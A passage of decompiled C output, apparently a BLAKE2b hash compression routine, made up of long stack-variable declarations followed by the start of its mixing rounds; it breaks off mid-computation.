  __int64 v592; // [rsp+0h] [rbp-1F8h]
  __int64 v593; // [rsp+0h] [rbp-1F8h]
  unsigned __int64 v594; // [rsp+0h] [rbp-1F8h]
  __int64 v595; // [rsp+8h] [rbp-1F0h]
  __int64 v596; // [rsp+8h] [rbp-1F0h]
  __int64 v597; // [rsp+8h] [rbp-1F0h]
  __int64 v598; // [rsp+8h] [rbp-1F0h]
  __int64 v599; // [rsp+8h] [rbp-1F0h]
  __int64 v600; // [rsp+8h] [rbp-1F0h]
  __int64 v601; // [rsp+8h] [rbp-1F0h]
  __int64 v602; // [rsp+8h] [rbp-1F0h]
  __int64 v603; // [rsp+8h] [rbp-1F0h]
  __int64 v604; // [rsp+8h] [rbp-1F0h]
  __int64 v605; // [rsp+8h] [rbp-1F0h]
  __int64 v606; // [rsp+8h] [rbp-1F0h]
  __int64 v607; // [rsp+8h] [rbp-1F0h]
  __int64 v608; // [rsp+8h] [rbp-1F0h]
  __int64 v609; // [rsp+8h] [rbp-1F0h]
  __int64 v610; // [rsp+8h] [rbp-1F0h]
  __int64 v611; // [rsp+8h] [rbp-1F0h]
  __int64 v612; // [rsp+8h] [rbp-1F0h]
  __int64 v613; // [rsp+8h] [rbp-1F0h]
  __int64 v614; // [rsp+8h] [rbp-1F0h]
  __int64 v615; // [rsp+8h] [rbp-1F0h]
  __int64 v616; // [rsp+8h] [rbp-1F0h]
  __int64 v617; // [rsp+8h] [rbp-1F0h]
  __int64 v618; // [rsp+8h] [rbp-1F0h]
  __int64 v619; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v620; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v621; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v622; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v623; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v624; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v625; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v626; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v627; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v628; // [rsp+8h] [rbp-1F0h]
  __int64 v629; // [rsp+8h] [rbp-1F0h]
  __int64 v630; // [rsp+8h] [rbp-1F0h]
  __int64 v631; // [rsp+8h] [rbp-1F0h]
  __int64 v632; // [rsp+8h] [rbp-1F0h]
  __int64 v633; // [rsp+8h] [rbp-1F0h]
  __int64 v634; // [rsp+8h] [rbp-1F0h]
  __int64 v635; // [rsp+8h] [rbp-1F0h]
  __int64 v636; // [rsp+8h] [rbp-1F0h]
  unsigned __int64 v637; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v638; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v639; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v640; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v641; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v642; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v643; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v644; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v645; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v646; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v647; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v648; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v649; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v650; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v651; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v652; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v653; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v654; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v655; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v656; // [rsp+10h] [rbp-1E8h]
  __int64 v657; // [rsp+10h] [rbp-1E8h]
  __int64 v658; // [rsp+10h] [rbp-1E8h]
  __int64 v659; // [rsp+10h] [rbp-1E8h]
  __int64 v660; // [rsp+10h] [rbp-1E8h]
  __int64 v661; // [rsp+10h] [rbp-1E8h]
  __int64 v662; // [rsp+10h] [rbp-1E8h]
  __int64 v663; // [rsp+10h] [rbp-1E8h]
  __int64 v664; // [rsp+10h] [rbp-1E8h]
  __int64 v665; // [rsp+10h] [rbp-1E8h]
  __int64 v666; // [rsp+10h] [rbp-1E8h]
  __int64 v667; // [rsp+10h] [rbp-1E8h]
  __int64 v668; // [rsp+10h] [rbp-1E8h]
  __int64 v669; // [rsp+10h] [rbp-1E8h]
  __int64 v670; // [rsp+10h] [rbp-1E8h]
  __int64 v671; // [rsp+10h] [rbp-1E8h]
  __int64 v672; // [rsp+10h] [rbp-1E8h]
  __int64 v673; // [rsp+10h] [rbp-1E8h]
  __int64 v674; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v675; // [rsp+10h] [rbp-1E8h]
  unsigned __int64 v676; // [rsp+10h] [rbp-1E8h]
  __int64 v677; // [rsp+10h] [rbp-1E8h]
  __int64 v678; // [rsp+18h] [rbp-1E0h]
  __int64 v679; // [rsp+18h] [rbp-1E0h]
  __int64 v680; // [rsp+18h] [rbp-1E0h]
  __int64 v681; // [rsp+18h] [rbp-1E0h]
  __int64 v682; // [rsp+18h] [rbp-1E0h]
  __int64 v683; // [rsp+18h] [rbp-1E0h]
  __int64 v684; // [rsp+18h] [rbp-1E0h]
  __int64 v685; // [rsp+18h] [rbp-1E0h]
  __int64 v686; // [rsp+18h] [rbp-1E0h]
  __int64 v687; // [rsp+18h] [rbp-1E0h]
  __int64 v688; // [rsp+18h] [rbp-1E0h]
  __int64 v689; // [rsp+18h] [rbp-1E0h]
  __int64 v690; // [rsp+18h] [rbp-1E0h]
  __int64 v691; // [rsp+18h] [rbp-1E0h]
  __int64 v692; // [rsp+18h] [rbp-1E0h]
  __int64 v693; // [rsp+18h] [rbp-1E0h]
  __int64 v694; // [rsp+18h] [rbp-1E0h]
  __int64 v695; // [rsp+18h] [rbp-1E0h]
  __int64 v696; // [rsp+18h] [rbp-1E0h]
  __int64 v697; // [rsp+18h] [rbp-1E0h]
  __int64 v698; // [rsp+18h] [rbp-1E0h]
  __int64 v699; // [rsp+18h] [rbp-1E0h]
  __int64 v700; // [rsp+18h] [rbp-1E0h]
  __int64 v701; // [rsp+18h] [rbp-1E0h]
  __int64 v702; // [rsp+18h] [rbp-1E0h]
  __int64 v703; // [rsp+18h] [rbp-1E0h]
  __int64 v704; // [rsp+18h] [rbp-1E0h]
  __int64 v705; // [rsp+18h] [rbp-1E0h]
  __int64 v706; // [rsp+18h] [rbp-1E0h]
  __int64 v707; // [rsp+18h] [rbp-1E0h]
  __int64 v708; // [rsp+18h] [rbp-1E0h]
  __int64 v709; // [rsp+18h] [rbp-1E0h]
  __int64 v710; // [rsp+18h] [rbp-1E0h]
  __int64 v711; // [rsp+18h] [rbp-1E0h]
  __int64 v712; // [rsp+18h] [rbp-1E0h]
  __int64 v713; // [rsp+18h] [rbp-1E0h]
  __int64 v714; // [rsp+18h] [rbp-1E0h]
  __int64 v715; // [rsp+18h] [rbp-1E0h]
  __int64 v716; // [rsp+18h] [rbp-1E0h]
  __int64 v717; // [rsp+20h] [rbp-1D8h]
  __int64 v718; // [rsp+20h] [rbp-1D8h]
  __int64 v719; // [rsp+20h] [rbp-1D8h]
  __int64 v720; // [rsp+20h] [rbp-1D8h]
  __int64 v721; // [rsp+20h] [rbp-1D8h]
  __int64 v722; // [rsp+20h] [rbp-1D8h]
  __int64 v723; // [rsp+20h] [rbp-1D8h]
  __int64 v724; // [rsp+28h] [rbp-1D0h]
  __int64 v725; // [rsp+28h] [rbp-1D0h]
  __int64 v726; // [rsp+28h] [rbp-1D0h]
  __int64 v727; // [rsp+28h] [rbp-1D0h]
  __int64 v728; // [rsp+28h] [rbp-1D0h]
  __int64 v729; // [rsp+28h] [rbp-1D0h]
  __int64 v730; // [rsp+28h] [rbp-1D0h]
  __int64 v731; // [rsp+28h] [rbp-1D0h]
  __int64 v732; // [rsp+28h] [rbp-1D0h]
  __int64 v733; // [rsp+28h] [rbp-1D0h]
  __int64 v734; // [rsp+28h] [rbp-1D0h]
  __int64 v735; // [rsp+28h] [rbp-1D0h]
  __int64 v736; // [rsp+28h] [rbp-1D0h]
  __int64 v737; // [rsp+28h] [rbp-1D0h]
  __int64 v738; // [rsp+28h] [rbp-1D0h]
  __int64 v739; // [rsp+28h] [rbp-1D0h]
  __int64 v740; // [rsp+28h] [rbp-1D0h]
  __int64 v741; // [rsp+28h] [rbp-1D0h]
  __int64 v742; // [rsp+28h] [rbp-1D0h]
  __int64 v743; // [rsp+28h] [rbp-1D0h]
  __int64 v744; // [rsp+28h] [rbp-1D0h]
  __int64 v745; // [rsp+28h] [rbp-1D0h]
  __int64 v746; // [rsp+28h] [rbp-1D0h]
  __int64 v747; // [rsp+28h] [rbp-1D0h]
  __int64 v748; // [rsp+28h] [rbp-1D0h]
  __int64 v749; // [rsp+28h] [rbp-1D0h]
  __int64 v750; // [rsp+30h] [rbp-1C8h]
  __int64 v751; // [rsp+30h] [rbp-1C8h]
  __int64 v752; // [rsp+30h] [rbp-1C8h]
  __int64 v753; // [rsp+30h] [rbp-1C8h]
  __int64 v754; // [rsp+30h] [rbp-1C8h]
  __int64 v755; // [rsp+30h] [rbp-1C8h]
  __int64 v756; // [rsp+30h] [rbp-1C8h]
  __int64 v757; // [rsp+30h] [rbp-1C8h]
  __int64 v758; // [rsp+30h] [rbp-1C8h]
  __int64 v759; // [rsp+30h] [rbp-1C8h]
  __int64 v760; // [rsp+30h] [rbp-1C8h]
  __int64 v761; // [rsp+30h] [rbp-1C8h]
  __int64 v762; // [rsp+30h] [rbp-1C8h]
  __int64 v763; // [rsp+30h] [rbp-1C8h]
  __int64 v764; // [rsp+30h] [rbp-1C8h]
  __int64 v765; // [rsp+30h] [rbp-1C8h]
  __int64 v766; // [rsp+38h] [rbp-1C0h]
  __int64 v767; // [rsp+38h] [rbp-1C0h]
  __int64 v768; // [rsp+38h] [rbp-1C0h]
  __int64 v769; // [rsp+38h] [rbp-1C0h]
  __int64 v770; // [rsp+38h] [rbp-1C0h]
  __int64 v771; // [rsp+38h] [rbp-1C0h]
  __int64 v772; // [rsp+38h] [rbp-1C0h]
  __int64 v773; // [rsp+38h] [rbp-1C0h]
  __int64 v774; // [rsp+38h] [rbp-1C0h]
  __int64 v775; // [rsp+38h] [rbp-1C0h]
  __int64 v776; // [rsp+38h] [rbp-1C0h]
  __int64 v777; // [rsp+38h] [rbp-1C0h]
  __int64 v778; // [rsp+38h] [rbp-1C0h]
  __int64 v779; // [rsp+38h] [rbp-1C0h]
  __int64 v780; // [rsp+38h] [rbp-1C0h]
  __int64 v781; // [rsp+38h] [rbp-1C0h]
  __int64 v782; // [rsp+38h] [rbp-1C0h]
  __int64 v783; // [rsp+38h] [rbp-1C0h]
  __int64 v784; // [rsp+38h] [rbp-1C0h]
  __int64 v785; // [rsp+38h] [rbp-1C0h]
  __int64 v786; // [rsp+38h] [rbp-1C0h]
  __int64 v787; // [rsp+38h] [rbp-1C0h]
  __int64 v788; // [rsp+38h] [rbp-1C0h]
  __int64 v789; // [rsp+40h] [rbp-1B8h]
  __int64 v790; // [rsp+40h] [rbp-1B8h]
  __int64 v791; // [rsp+40h] [rbp-1B8h]
  __int64 v792; // [rsp+40h] [rbp-1B8h]
  __int64 v793; // [rsp+40h] [rbp-1B8h]
  __int64 v794; // [rsp+40h] [rbp-1B8h]
  __int64 v795; // [rsp+40h] [rbp-1B8h]
  __int64 v796; // [rsp+40h] [rbp-1B8h]
  __int64 v797; // [rsp+40h] [rbp-1B8h]
  __int64 v798; // [rsp+40h] [rbp-1B8h]
  __int64 v799; // [rsp+40h] [rbp-1B8h]
  __int64 v800; // [rsp+40h] [rbp-1B8h]
  __int64 v801; // [rsp+40h] [rbp-1B8h]
  __int64 v802; // [rsp+40h] [rbp-1B8h]
  __int64 v803; // [rsp+40h] [rbp-1B8h]
  __int64 v804; // [rsp+40h] [rbp-1B8h]
  __int64 v805; // [rsp+40h] [rbp-1B8h]
  __int64 v806; // [rsp+40h] [rbp-1B8h]
  __int64 v807; // [rsp+40h] [rbp-1B8h]
  __int64 v808; // [rsp+40h] [rbp-1B8h]
  __int64 v809; // [rsp+48h] [rbp-1B0h]
  __int64 v810; // [rsp+48h] [rbp-1B0h]
  __int64 v811; // [rsp+50h] [rbp-1A8h]
  unsigned __int64 v812; // [rsp+68h] [rbp-190h]
  __int64 v813; // [rsp+70h] [rbp-188h]
  unsigned __int64 v814; // [rsp+80h] [rbp-178h]
  unsigned __int64 v815; // [rsp+88h] [rbp-170h]
  unsigned __int64 v816; // [rsp+90h] [rbp-168h]
  __int64 v817; // [rsp+98h] [rbp-160h]
  __int64 v818; // [rsp+98h] [rbp-160h]
  __int64 v819; // [rsp+A0h] [rbp-158h]
  unsigned __int64 v820; // [rsp+A8h] [rbp-150h]
  __m128i *v821; // [rsp+B0h] [rbp-148h]
  unsigned __int64 v822; // [rsp+B8h] [rbp-140h]
  unsigned __int64 v823; // [rsp+C0h] [rbp-138h]

  v3 = a1[7];
  result = 128i64;
  v5 = *a1;
  v6 = a1[1];
  v7 = a1[2];
  if ( a3 < 0x80 )
    result = a3;
  v8 = a1[3];
  v9 = a1[4];
  v10 = a1[5];
  v822 = a3;
  v817 = a1[6];
  v821 = a2;
  v823 = result;
  v809 = a1[7];
  do
  {
    v11 = *a2;
    v12 = a2[1];
    v13 = a2[2];
    v14 = a2[3];
    v15 = a2[4];
    v16 = a2[5];
    v17 = a2[6];
    v18 = a2[7];
    a1[8] += result;
    v19 = a1[8];
    a1[9] += v19 < result;
    v20 = v9 + v11.m128i_i64[0] + v5;
    v812 = _mm_srli_si128(v11, 8).m128i_u64[0];
    v21 = __ROR8__(v20 ^ v19 ^ 0x510E527FADE682D1i64, 32);
    v22 = v21 + 0x6A09E667F3BCC908i64;
    v23 = __ROR8__(v9 ^ (v21 + 0x6A09E667F3BCC908i64), 24);
    v24 = v23 + v812 + v20;
    v25 = __ROR8__(v24 ^ v21, 16);
    v26 = v10 + v12.m128i_i64[0] + v6;
    v27 = __ROR8__(v26 ^ a1[9] ^ 0x9B05688C2B3E6C1Fui64, 32);
    v766 = v25 + v22;
    v816 = _mm_srli_si128(v12, 8).m128i_u64[0];
    v28 = __ROL8__(v23 ^ (v25 + v22), 1);
    v29 = __ROR8__(v10 ^ (v27 - 0x4498517A7B3558C5i64), 24);
    v637 = v29 + v816 + v26;
    v30 = __ROR8__(v637 ^ v27, 16);
    v724 = v30 + v27 - 0x4498517A7B3558C5i64;
    v31 = v817 + v13.m128i_i64[0] + v7;
    v32 = __ROL8__(v29 ^ v724, 1);
    v33 = __ROR8__(v31 ^ a1[10] ^ 0x1F83D9ABFB41BD6Bi64, 32);
    v34 = v33 + 0x3C6EF372FE94F82Bi64;
    v35 = __ROR8__(v817 ^ (v33 + 0x3C6EF372FE94F82Bi64), 24);
    v815 = _mm_srli_si128(v13, 8).m128i_u64[0];
    v678 = v35 + v815 + v31;
    v36 = v3 + v14.m128i_i64[0] + v8;
    v37 = __ROR8__(v678 ^ v33, 16);
    v38 = v37 + v34;
    v39 = __ROR8__(v36 ^ a1[11] ^ 0x5BE0CD19137E2179i64, 32);
    v40 = v39 - 0x5AB00AC5A0E2C90Fi64;
    v814 = _mm_srli_si128(v14, 8).m128i_u64[0];
    v41 = __ROL8__(v35 ^ v38, 1);
    v42 = __ROR8__(v809 ^ (v39 - 0x5AB00AC5A0E2C90Fi64), 24);
    v43 = v42 + v814 + v36;
    v819 = v15.m128i_i64[0];
    v44 = __ROR8__(v43 ^ v39, 16);
    v45 = v32 + v15.m128i_i64[0] + v24;
    v15.m128i_i64[0] = _mm_srli_si128(v15, 8).m128i_u64[0];
    v46 = v44 + v40;
    v47 = __ROL8__(v42 ^ v46, 1);
    v48 = __ROR8__(v44 ^ v45, 32);
    v49 = v48 + v38;
    v50 = __ROR8__(v49 ^ v32, 24);
    v595 = v50 + v15.m128i_i64[0] + v45;
    v820 = _mm_srli_si128(v16, 8).m128i_u64[0];
    v51 = __ROR8__(v48 ^ v595, 16);
    v750 = v51 + v49;
    v52 = __ROR8__(v25 ^ (v41 + v16.m128i_i64[0] + v637), 32);
    v53 = v52 + v46;
    v54 = __ROL8__((v51 + v49) ^ v50, 1);
    v55 = __ROR8__(v41 ^ v53, 24);
    v638 = v55 + v820 + v41 + v16.m128i_i64[0] + v637;
    v813 = v17.m128i_i64[0];
    v56 = v47 + v17.m128i_i64[0] + v678;
    v57 = __ROR8__(v52 ^ v638, 16);
    v17.m128i_i64[0] = _mm_srli_si128(v17, 8).m128i_u64[0];
    v789 = v57 + v53;
    v58 = v55 ^ (v57 + v53);
    v59 = v18.m128i_i64[0];
    v60 = __ROR8__(v56 ^ v30, 32);
    v61 = v60 + v766;
    v18.m128i_i64[0] = _mm_srli_si128(v18, 8).m128i_u64[0];
    v62 = __ROL8__(v58, 1);
    v63 = __ROR8__(v47 ^ (v60 + v766), 24);
    v679 = v63 + v17.m128i_i64[0] + v56;
    v64 = __ROR8__(v679 ^ v60, 16);
    v65 = v64 + v61;
    v717 = v64;
    v66 = __ROL8__(v63 ^ v65, 1);
    v552 = v28 + v59 + v43;
    v67 = __ROR8__(v37 ^ v552, 32);
    v68 = __ROR8__(v28 ^ (v67 + v724), 24);
    v553 = v68 + v18.m128i_i64[0] + v552;
    v69 = __ROR8__(v67 ^ v553, 16);
    v70 = v69 + v67 + v724;
    v71 = __ROL8__(v68 ^ v70, 1);
    v596 = v71 + v59 + v595;
    v72 = __ROR8__(v596 ^ v57, 32);
    v73 = v72 + v65;
    v74 = __ROR8__(v71 ^ v73, 24);
    v75 = (v74 + v16.m128i_i64[0] + v596) ^ v72;
    v597 = v74 + v16.m128i_i64[0] + v596;
    v76 = __ROR8__(v75, 16);
    v767 = v76 + v73;
    v77 = __ROL8__(v74 ^ (v76 + v73), 1);
    v639 = v54 + v13.m128i_i64[0] + v638;
    v78 = __ROR8__(v639 ^ v717, 32);
    v79 = v78 + v70;
    v80 = __ROR8__(v54 ^ v79, 24);
    v640 = v80 + v819 + v639;
    v81 = __ROR8__(v640 ^ v78, 16);
    v82 = v81 + v79;
    v718 = v81;
    v83 = v80 ^ v82;
    v725 = v82;
    v84 = v62 + v15.m128i_i64[0] + v679;
    v85 = __ROL8__(v83, 1);
    v86 = __ROR8__(v84 ^ v69, 32);
    v87 = v86 + v750;
    v88 = __ROR8__(v62 ^ (v86 + v750), 24);
    v680 = v88 + v18.m128i_i64[0] + v84;
    v89 = __ROR8__(v680 ^ v86, 16);
    v90 = v89 + v87;
    v91 = __ROL8__(v88 ^ v90, 1);
    v554 = v66 + v17.m128i_i64[0] + v553;
    v92 = __ROR8__(v554 ^ v51, 32);
    v93 = v92 + v789;
    v94 = __ROR8__(v66 ^ (v92 + v789), 24);
    v555 = v94 + v14.m128i_i64[0] + v554;
    v95 = __ROR8__(v555 ^ v92, 16);
    v96 = v95 + v93;
    v97 = __ROL8__(v94 ^ v96, 1);
    v598 = v85 + v812 + v597;
    v98 = __ROR8__(v95 ^ v598, 32);
    v99 = v98 + v90;
    v100 = __ROR8__(v99 ^ v85, 24);
    v599 = v100 + v813 + v598;
    v101 = __ROR8__(v98 ^ v599, 16);
    v751 = v101 + v99;
    v102 = __ROL8__((v101 + v99) ^ v100, 1);
    v641 = v91 + v11.m128i_i64[0] + v640;
    v103 = __ROR8__(v76 ^ v641, 32);
    v104 = v103 + v96;
    v105 = __ROR8__(v91 ^ v104, 24);
    v642 = v105 + v12.m128i_i64[0] + v641;
    v106 = __ROR8__(v103 ^ v642, 16);
    v790 = v106 + v104;
    v107 = __ROL8__(v105 ^ (v106 + v104), 1);
    v681 = v97 + v820 + v680;
    v108 = __ROR8__(v681 ^ v718, 32);
    v109 = v108 + v767;
    v110 = __ROR8__(v97 ^ (v108 + v767), 24);
    v682 = v110 + v814 + v681;
    v111 = __ROR8__(v682 ^ v108, 16);
    v768 = v111 + v109;
    v112 = __ROL8__(v110 ^ (v111 + v109), 1);
    v556 = v77 + v815 + v555;
    v113 = __ROR8__(v89 ^ v556, 32);
    v114 = __ROR8__(v77 ^ (v113 + v725), 24);
    v557 = v114 + v816 + v556;
    v115 = __ROR8__(v113 ^ v557, 16);
    v116 = v115 + v113 + v725;
    v117 = __ROL8__(v114 ^ v116, 1);
    v600 = v117 + v820 + v599;
    v118 = __ROR8__(v600 ^ v106, 32);
    v119 = v118 + v768;
    v120 = __ROR8__(v117 ^ (v118 + v768), 24);
    v601 = v120 + v819 + v600;
    v121 = __ROR8__(v601 ^ v118, 16);
    v643 = v102 + v813 + v642;
    v769 = v121 + v119;
    v122 = __ROL8__(v120 ^ (v121 + v119), 1);
    v123 = __ROR8__(v643 ^ v111, 32);
    v124 = v123 + v116;
    v125 = __ROR8__(v102 ^ v124, 24);
    v126 = (v125 + v11.m128i_i64[0] + v643) ^ v123;
    v644 = v125 + v11.m128i_i64[0] + v643;
    v127 = __ROR8__(v126, 16);
    v128 = v127 + v124;
    v719 = v127;
    v129 = v107 + v815 + v682;
    v726 = v128;
    v130 = __ROL8__(v125 ^ v128, 1);
    v131 = __ROR8__(v129 ^ v115, 32);
    v132 = v131 + v751;
    v133 = __ROR8__(v107 ^ (v131 + v751), 24);
    v683 = v133 + v12.m128i_i64[0] + v129;
    v134 = __ROR8__(v683 ^ v131, 16);
    v135 = v134 + v132;
    v136 = __ROL8__(v133 ^ v135, 1);
    v558 = v112 + v18.m128i_i64[0] + v557;
    v137 = __ROR8__(v558 ^ v101, 32);
    v138 = v137 + v790;
    v139 = __ROR8__(v112 ^ (v137 + v790), 24);
    v559 = v139 + v17.m128i_i64[0] + v558;
    v140 = __ROR8__(v559 ^ v137, 16);
    v141 = v140 + v138;
    v142 = __ROL8__(v139 ^ v141, 1);
    v602 = v130 + v16.m128i_i64[0] + v601;
    v143 = __ROR8__(v140 ^ v602, 32);
    v144 = v143 + v135;
    v145 = __ROR8__(v144 ^ v130, 24);
    v603 = v145 + v59 + v602;
    v146 = __ROR8__(v143 ^ v603, 16);
    v752 = v146 + v144;
    v147 = __ROL8__((v146 + v144) ^ v145, 1);
    v148 = __ROR8__(v121 ^ (v136 + v816 + v644), 32);
    v791 = v148 + v141;
    v149 = __ROR8__(v136 ^ (v148 + v141), 24);
    v645 = v149 + v14.m128i_i64[0] + v136 + v816 + v644;
    v150 = __ROR8__(v148 ^ v645, 16);
    v684 = v142 + v814 + v683;
    v151 = __ROR8__(v684 ^ v719, 32);
    v792 = v150 + v791;
    v152 = v149 ^ v792;
    v153 = v151 + v769;
    v154 = __ROL8__(v152, 1);
    v155 = __ROR8__(v142 ^ (v151 + v769), 24);
    v685 = v155 + v812 + v684;
    v156 = __ROR8__(v685 ^ v151, 16);
    v770 = v156 + v153;
    v157 = __ROL8__(v155 ^ (v156 + v153), 1);
    v560 = v122 + v15.m128i_i64[0] + v559;
    v158 = __ROR8__(v134 ^ v560, 32);
    v727 = v158 + v726;
    v159 = __ROR8__(v122 ^ v727, 24);
    v561 = v159 + v13.m128i_i64[0] + v560;
    v160 = __ROR8__(v158 ^ v561, 16);
    v728 = v160 + v727;
    v161 = __ROL8__(v159 ^ v728, 1);
    v604 = v161 + v814 + v603;
    v162 = __ROR8__(v604 ^ v150, 32);
    v163 = v162 + v770;
    v164 = __ROR8__(v161 ^ (v162 + v770), 24);
    v605 = v164 + v15.m128i_i64[0] + v604;
    v165 = __ROR8__(v605 ^ v162, 16);
    v646 = v147 + v816 + v645;
    v166 = __ROR8__(v646 ^ v156, 32);
    v771 = v165 + v163;
    v167 = v164 ^ (v165 + v163);
    v168 = v166 + v728;
    v169 = __ROL8__(v167, 1);
    v170 = __ROR8__(v147 ^ (v166 + v728), 24);
    v647 = v170 + v812 + v646;
    v171 = __ROR8__(v647 ^ v166, 16);
    v172 = v171 + v168;
    v720 = v171;
    v173 = v170 ^ v172;
    v729 = v172;
    v174 = v154 + v17.m128i_i64[0] + v685;
    v175 = __ROL8__(v173, 1);
    v176 = __ROR8__(v174 ^ v160, 32);
    v177 = v176 + v752;
    v178 = __ROR8__(v154 ^ (v176 + v752), 24);
    v686 = v178 + v813 + v174;
    v179 = __ROR8__(v686 ^ v176, 16);
    v180 = v179 + v177;
    v181 = __ROL8__(v178 ^ v180, 1);
    v562 = v157 + v820 + v561;
    v182 = __ROR8__(v562 ^ v146, 32);
    v183 = v182 + v792;
    v184 = __ROR8__(v157 ^ (v182 + v792), 24);
    v563 = v184 + v59 + v562;
    v185 = __ROR8__(v563 ^ v182, 16);
    v186 = v185 + v183;
    v187 = __ROL8__(v184 ^ v186, 1);
    v606 = v175 + v12.m128i_i64[0] + v605;
    v188 = __ROR8__(v185 ^ v606, 32);
    v753 = v188 + v180;
    v189 = __ROR8__((v188 + v180) ^ v175, 24);
    v607 = v189 + v14.m128i_i64[0] + v606;
    v190 = __ROR8__(v188 ^ v607, 16);
    v191 = __ROL8__((v190 + v753) ^ v189, 1);
    v192 = __ROR8__(v165 ^ (v181 + v815 + v647), 32);
    v793 = v192 + v186;
    v193 = __ROR8__(v181 ^ (v192 + v186), 24);
    v648 = v193 + v16.m128i_i64[0] + v181 + v815 + v647;
    v194 = __ROR8__(v192 ^ v648, 16);
    v687 = v187 + v13.m128i_i64[0] + v686;
    v794 = v194 + v793;
    v195 = __ROL8__(v193 ^ v794, 1);
    v196 = __ROR8__(v687 ^ v720, 32);
    v197 = v196 + v771;
    v198 = __ROR8__(v187 ^ (v196 + v771), 24);
    v688 = v198 + v11.m128i_i64[0] + v687;
    v199 = __ROR8__(v688 ^ v196, 16);
    v772 = v199 + v197;
    v200 = __ROL8__(v198 ^ (v199 + v197), 1);
    v564 = v169 + v18.m128i_i64[0] + v563;
    v201 = __ROR8__(v179 ^ v564, 32);
    v730 = v201 + v729;
    v202 = __ROR8__(v169 ^ v730, 24);
    v565 = v202 + v819 + v564;
    v203 = __ROR8__(v201 ^ v565, 16);
    v731 = v203 + v730;
    v204 = __ROL8__(v202 ^ v731, 1);
    v608 = v204 + v15.m128i_i64[0] + v607;
    v205 = __ROR8__(v608 ^ v194, 32);
    v206 = v205 + v772;
    v207 = __ROR8__(v204 ^ (v205 + v772), 24);
    v208 = (v207 + v11.m128i_i64[0] + v608) ^ v205;
    v609 = v207 + v11.m128i_i64[0] + v608;
    v209 = __ROR8__(v208, 16);
    v649 = v191 + v815 + v648;
    v210 = __ROR8__(v649 ^ v199, 32);
    v773 = v209 + v206;
    v211 = v207 ^ (v209 + v206);
    v212 = v210 + v731;
    v213 = __ROL8__(v211, 1);
    v214 = __ROR8__(v191 ^ (v210 + v731), 24);
    v650 = v214 + v814 + v649;
    v215 = __ROR8__(v650 ^ v210, 16);
    v732 = v215 + v212;
    v216 = __ROL8__(v214 ^ (v215 + v212), 1);
    v689 = v195 + v12.m128i_i64[0] + v688;
    v217 = __ROR8__(v689 ^ v203, 32);
    v218 = v217 + v190 + v753;
    v219 = __ROR8__(v195 ^ v218, 24);
    v690 = v219 + v13.m128i_i64[0] + v689;
    v220 = __ROR8__(v690 ^ v217, 16);
    v754 = v220 + v218;
    v221 = __ROL8__(v219 ^ (v220 + v218), 1);
    v566 = v200 + v16.m128i_i64[0] + v565;
    v222 = __ROR8__(v566 ^ v190, 32);
    v223 = v222 + v794;
    v224 = __ROR8__(v200 ^ (v222 + v794), 24);
    v567 = v224 + v18.m128i_i64[0] + v566;
    v225 = __ROR8__(v567 ^ v222, 16);
    v226 = v225 + v223;
    v227 = __ROL8__(v224 ^ v226, 1);
    v610 = v216 + v59 + v609;
    v228 = __ROR8__(v225 ^ v610, 32);
    v229 = (v228 + v754) ^ v216;
    v755 = v228 + v754;
    v230 = __ROR8__(v229, 24);
    v611 = v230 + v812 + v610;
    v231 = __ROR8__(v228 ^ v611, 16);
    v232 = __ROL8__((v231 + v755) ^ v230, 1);
    v651 = v221 + v820 + v650;
    v233 = __ROR8__(v209 ^ v651, 32);
    v795 = v233 + v226;
    v234 = __ROR8__(v221 ^ (v233 + v226), 24);
    v652 = v234 + v813 + v651;
    v235 = __ROR8__(v233 ^ v652, 16);
    v691 = v227 + v14.m128i_i64[0] + v690;
    v236 = __ROR8__(v691 ^ v215, 32);
    v796 = v235 + v795;
    v237 = v234 ^ v796;
    v238 = v236 + v773;
    v239 = __ROL8__(v237, 1);
    v240 = __ROR8__(v227 ^ (v236 + v773), 24);
    v692 = v819 + v240 + v691;
    v241 = __ROR8__(v692 ^ v236, 16);
    v774 = v241 + v238;
    v242 = __ROL8__(v240 ^ (v241 + v238), 1);
    v568 = v213 + v816 + v567;
    v243 = __ROR8__(v220 ^ v568, 32);
    v733 = v243 + v732;
    v244 = __ROR8__(v213 ^ v733, 24);
    v569 = v244 + v17.m128i_i64[0] + v568;
    v245 = __ROR8__(v243 ^ v569, 16);
    v734 = v245 + v733;
    v246 = __ROL8__(v244 ^ v734, 1);
    v612 = v246 + v12.m128i_i64[0] + v611;
    v247 = __ROR8__(v612 ^ v235, 32);
    v248 = v247 + v774;
    v249 = __ROR8__(v246 ^ (v247 + v774), 24);
    v613 = v249 + v813 + v612;
    v250 = __ROR8__(v613 ^ v247, 16);
    v653 = v232 + v14.m128i_i64[0] + v652;
    v251 = __ROR8__(v653 ^ v241, 32);
    v775 = v250 + v248;
    v252 = v249 ^ (v250 + v248);
    v253 = v251 + v734;
    v254 = __ROL8__(v252, 1);
    v255 = __ROR8__(v232 ^ (v251 + v734), 24);
    v654 = v255 + v16.m128i_i64[0] + v653;
    v256 = __ROR8__(v654 ^ v251, 16);
    v735 = v256 + v253;
